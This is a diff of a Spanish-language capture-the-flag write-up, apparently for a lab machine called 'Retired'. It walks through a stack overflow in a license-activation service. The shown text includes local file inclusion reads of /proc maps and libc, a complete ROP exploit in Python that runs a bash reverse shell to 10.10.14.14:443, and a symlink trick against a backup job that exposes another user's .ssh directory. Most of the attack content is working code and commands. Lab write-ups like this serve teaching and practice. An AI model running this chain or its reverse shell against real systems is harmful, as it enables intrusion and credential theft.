@@ -170,7 +170,7 @@ int main(int argc,char **argv) {
   		activate_license(sockfd);
   		exit(0);}
 ```
-Luego tenemos esa función "activate_license":
+Luego tenemos esa función "activate_license"
 ```c
 void activate_license(int sockfd){
   int sqlite;
@@ -196,9 +196,6 @@ key TEXT)" ,0,0,0);
   printf("[+] activated license: %s\n",buffer); return;}
 ```
 
-----------------------------
-# Part 5: Descubriendo en bug
-
 Pero y si lo que le metemos a buffer por sockfd es mas grande que lo especificado en mslen?
 ```
 └─$ printf "\x00\x00\x00\x01AAAA" | nc localhost 6668
@@ -208,8 +205,10 @@ Pero y si lo que le metemos a buffer por sockfd es mas grande que lo especificad
 [+] reading 1 bytes
 [+] activated license: A
 ```
-Si le mandamos esto ```printf "\x00\x00\x02\x00$(python3 -c 'print("A" * 600)')" | nc localhost 6668```  (mete 600 A en 512 de tamaño) al final
-de las AAA pone bytes extraños, el proceso se ha corromprido de cierta manera. Pero por que no da SEGFAULT? porque es un proceso hijo
+Si le mandamos esto ```printf "\x00\x00\x02\x00$(python3 -c 'print("A" * 600)')" | nc localhost 6668``` 
+(mete 600 A en 512 de tamaño) al final de las AAA pone bytes extraños, el proceso se ha corromprido de 
+cierta manera. Pero por que no da SEGFAULT? porque es un proceso hijo
+
 Si lo corremos con gdb en otro puerto ej:
 ```console
 └─$ gdb ./activate_licens
@@ -218,6 +217,8 @@ gef➤  r 6667
 # printf "\x00\x00\x03\x00$(python3 -c 'print("A" * 1000)')" | nc localhost 6668
 # >>> SEGFAULT (mete 1000 A en 768 bytes)
 ```
+
+# -------------------
 
 Vemos primero las protecciones:
 ```console
@@ -231,25 +232,36 @@ PIE                           : ✓ -> memoria aleatorizada
 Fortify                       : ✘
 RelRO                         : Full -> No podemos modificar la tabla GOT
 ```
-Primero hay que conseguir la libc que esta usando:
+Conseguir la libc que esta usando:
 ```console
 └─$ curl -s http://10.10.11.154/index.php?page=php://filter/convert.base64-encode/resource=/proc/413/maps | base64 -d  | grep "libc"
 7fc8a1464000-7fc8a1489000 r--p 00000000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
 └─$ curl -s http://10.10.11.154/index.php?page=php://filter/convert.base64-encode/resource=/usr/lib/x86_64-linux-gnu/libc-2.31.so | base64 -d > libc-2.31.so
 ```
 Conseguir las direcciones base (libc y el binario):
-Como las direcciones cambian siempre que se reinicia la maquina con este script se pillan:
+Como las direcciones cambian siemore que se reinicia la maquina con este script se pillan
 ```bash
 base64_url="http://10.10.11.154/index.php?page=php://filter/convert.base64-encode/resource="
 pid=$(curl -s $base64_url/proc/sched_debug | base64 -d | grep "activate_licens" | awk '{print $3}') 
 libc_memory=$(curl -s $base64_url/proc/$pid/maps | base64 -d | grep "libc" | head -n1 | awk '{print $1}' | awk '{print $1}' FS="-")
-libc_memory=$(curl -s $base64_url/proc/$pid/maps | base64 -d | grep "activate_licens" | head -n1 | awk '{print $1}' | awk '{print $1}' FS="-")
+binary_memory=$(curl -s $base64_url/proc/$pid/maps | base64 -d | grep "activate_licens" | head -n1 | awk '{print $1}' | awk '{print $1}' FS="-")
 
-echo "Direccion de memoria del binario -> 0x${libc_memory}"
+echo "Direccion de memoria del binario -> 0x${binary_memory}"
 echo "Direccion de memoria de libc -> 0x${libc_memory}"
 ```
 
-¿Cuando corrompemos la pila (sobreescribir rip)? 
+Ver que parte del bianrio tiene permisos de escritura
+```console
+└─$ rabin2 -S ./activate_licens | grep "w"
+19  0x00002cb8    0x8 0x00003cb8    0x8 -rw- .init_array
+20  0x00002cc0    0x8 0x00003cc0    0x8 -rw- .fini_array
+21  0x00002cc8  0x200 0x00003cc8  0x200 -rw- .dynamic
+22  0x00002ec8  0x138 0x00003ec8  0x138 -rw- .got
+23  0x00003000   0x10 0x00004000   0x10 -rw- .data
+24  0x00003010    0x0 0x00004010    0x8 -rw- .bss
+```
+
+¿Cuando corrompemos la pila (sobreescribir rip)?
 ```console
 gef➤ pattern create 1024
 aaaaaaa...aaaaf
@@ -258,60 +270,106 @@ aaaaaaa...aaaaf
 $rsp   : 0x007fffffffded8  →  "paaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacva[...]"
 $rbp   : 0x636161616161616f ("oaaaaaac"?)
 $rsi   : 0x005555555592a0  →  "[+] activated license: aaaaaaaabaaaaaaacaaaaaaadaa[...]"
+
 [+] Found at offset 520 (little-endian search) likely
 ```
-Tras 520 bytes basura
+```console
+└─$ objdump -d libc-2.31.so | grep "system"    
+0000000000048e50 <__libc_system@@GLIBC_PRIVATE>:
+# Tambien con readelf -> readelf -s libc-2.31.so | grep "system" 
+```
 
-----------------------------
-# Part 6: Armando el exploit
+```console
+└─$ ropper -f libc-2.31.so --search "pop rdi; ret"
+0x0000000000026796: pop rdi; ret;
+└─$ ropper -f libc-2.31.so --search "pop rsi; ret"
+0x000000000002890f: pop rsi; ret;
+└─$ ropper -f libc-2.31.so --search "mov [rdi], rsi; ret"
+0x00000000000603b2: mov qword ptr [rdi], rsi; ret;
 
-Ahora armar el exploit.
-Consiste en crear ->  ```system("bash -c 'bash -i >& /dev/tcp/10.10.14.14/443 0>&1'")```
+└─$ rabin2 -S ./activate_licens | grep "w"
+23  0x00003000   0x10 0x00004000   0x10 -rw- .data
+```
 
-```python
+
+```python3
 #!/usr/bin/python3
-import socket, requests
+import socket
 from struct import pack
+import requests
 
+cmd = b"bash -c 'bash -i >& /dev/tcp/10.10.14.14/443 0>&1'"
 libc_base = 0x7f356ace6000
 binary_base = 0x5646c60f3000
-
-cmd = b"bash -c 'bash -i >& /dev/tcp/10.10.14.14/443 0>&1'" # Comando que le queremos pasar a system()
-# Ver una seccion con permisos de escritura en el binario a la que meterle esa cadena cmd:
-# └─$ rabin2 -S ./activate_licens | grep "w" 
-#  0x00003000   0x10 0x00004000   0x10 -rw- .data
-writable = binary_base + 0x00003000 
-
-# Buscar system 
-system = pack("<q",(libc_base + 0x00048e50)) # -> objdump -d libc-2.31.so | grep "system"  
-
-# Buscar los gadgets que permitan cargar en los registros datos para que las funciones los tomen como argumentos.
-pop_rdi = pack("<q",(libc_base + 0x0026796)) # -> ropper -f libc-2.31.so --search "pop rdi; ret"
-pop_rsi = pack("<q",(libc_base + 0x002890f)) # ->  ropper -f libc-2.31.so --search "pop rsi; ret"
-mov_rdi_rsi = pack("<q",(libc_base + 0x000603b2)) # -> ropper -f libc-2.31.so --search "mov [rdi], rsi; ret"
+writable = binary_base + 0x00004000
+system = pack("<q",(libc_base + 0x00048e50))
+pop_rdi = pack("<q",(libc_base + 0x0026796))
+pop_rsi = pack("<q",(libc_base + 0x002890f))
+mov_rdi_rsi = pack("<q",(libc_base + 0x000603b2))
 payload = b'A' * 520
 
-# Mete en la seccion con permiso de escritura  (writable) de 8 en 8 bytes el comando
-# ROP -> Tenemos en [rdi] (seccion con permiso de escritura || En [rsi] cmd 
-# Asi que moveremos el cmd de rdi a rsi donde esta la seccion con permiso de escritura -> ( mov [rdi <- rsi] )
+# Mete en writable de 8 en 8 bytes el comando
+# ROP -> rdi=writable  rsi=cmd   mov [rdi <- rsi]
 for i in range(0, len(cmd), 8):
-	payload += pop_rdi
-	payload += pack("<q",(writable + i))
-	payload += pop_rsi
-	payload += cmd[i:i+8].ljust(8, b"\x00")  # [0:8] [8:16] [16:24]... Ljust es para no dejar una ultima cadena de un byte y rellenarlo con "0"
-	payload += mov_rdi_rsi
+    payload += pop_rdi
+    payload += pack("<q",(writable + i))
+    payload += pop_rsi
+    payload += cmd[i:i+8].ljust(8, b"\x00")  # [0:8] [8:16] [16:24]...
+    payload += mov_rdi_rsi
 
-# Ahora ya tenemos el comando almacenado en la seccion con permisos de escritura, ahi que pasarsela a system mediante rdi.
 # system() <- rdi
 payload += pop_rdi
 payload += pack("<q",writable)
 payload += system
-
-# Toda esa cadena se mete en el archivo file.key que es el que se enviará a la máquina
 with open("file.key", "wb") as f:
-	f.write(payload)
+    f.write(payload)
+
 file = {'licensefile':("file.key", open("file.key","rb"), 'application/x-iwork-keynote-sffkey')}
 url = "http://10.10.11.154/activate_license.php"
 req = requests.post(url, files=file)
 ```
+
+```console
+www-data@retired:/tmp$ systemctl list-timers | head -n 4
+# Se ejecuta cada minuto website_backup.timer website_backup.service
+# /etc/systemd/system/website_backup.service
+[Unit]
+Description=Backup and rotate website
+[Service]
+User=dev
+Group=www-data
+ExecStart=/usr/bin/webbackup
+[Install]
+WantedBy=multi-user.target
+```
+
+Renombrando variables el script /usr/bin/webbackup es:
+```
+#!/bin/bash
+cd /var/www/
+/usr/bin/rm -f /var/www/fecha-html.zip   # Borra /var/www/fecha-html.zip 
+/usr/bin/zip --recurse-paths /var/www/fecha-html.zip /var/www/html # Comprime /var/www/html en /var/www/fecha-html.zip
+KEEP=10
+/usr/bin/find /var/www/ -maxdepth 1 -name '*.zip' -print0 | sort --zero-terminated --numeric-sort --reverse \
+    | while IFS= read -r -d '' backup; do
+        if [ "$KEEP" -le 0 ]; then
+            /usr/bin/rm --force -- "$backup"
+        fi
+        KEEP="$((KEEP-1))"
+    done
+```
+www-data@retired:~/html$ ln -s -f /home/dev /var/www/html
+www-data@retired:/tmp$ watch -n 1 ls /var/www/
+# Se crea 2023-01-22_10-18-00-html.zip
+www-data@retired:/tmp$ cp /var/www/2023-01-22_10-18-00-html.zip /tmp
+www-data@retired:/tmp$ cd /tmp/
+www-data@retired:/tmp$ unzip 2023-01-22_10-18-00-html.zip
+www-data@retired:/tmp$ cd ./var/www/html
+www-data@retired:/tmp/var/www/html$ cd dev
+www-data@retired:/tmp/var/www/html/dev$ ls -la
+drwx------ 2 www-data www-data 4096 Mar 11  2022 .ssh
+drwx------ 2 www-data www-data 4096 Mar 11  2022 activate_license
+drwx------ 3 www-data www-data 4096 Mar 11  2022 emuemu
+```
+
 
